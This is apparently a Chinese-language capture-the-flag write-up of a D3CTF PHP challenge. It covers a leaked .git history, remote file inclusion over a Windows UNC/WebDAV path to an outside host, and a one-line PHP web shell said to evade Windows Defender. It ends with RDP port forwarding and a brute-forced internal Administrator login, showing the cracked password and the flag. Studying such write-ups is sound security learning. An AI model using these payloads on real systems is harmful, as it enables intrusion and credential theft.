题目的代码和hitcon 2018 one-line-php-challenge一样，首先考虑session包含，但是无法复现，主机是windows系统，猜不到临时文件目录。
随便扫扫发现.git泄露，用Git_Extract可以得到完整的git历史记录。发现hint1.txt、hint2.txt、dict.txt。大概意思是要用dict里的密码连接到内网机器上。题目中有include_path和allow_url_include的限制导致RCE不了，但是windows机器特有的UNC路径可以绕过这些限制。可以用smb或是webdav协议。

> http://7317da5e40.fakeonelinephp.d3ctf.io/?orange=//202.112.28.106@8980//webdav/ix.php

然后发现phpinfo可以执行，但一句话执行不了，可能是Windows Defender当成木马杀掉了。可以用这个绕过查杀:`@<?php system(file_get_contents("php://input"));?>`，可执行任意命令。`ping 172.19.97.8`，内网是通的，接下来就是下载文件开3389端口转发，暴破内网rdp：
```
[8389][rdp] host: 172.19.97.8   login: Administrator   password: eDHU27TlY6ugslV
```
得到flag：d3ctf{Sh3ll_fr0m_ur1111_inc1ude!1!!!_soCoooool}
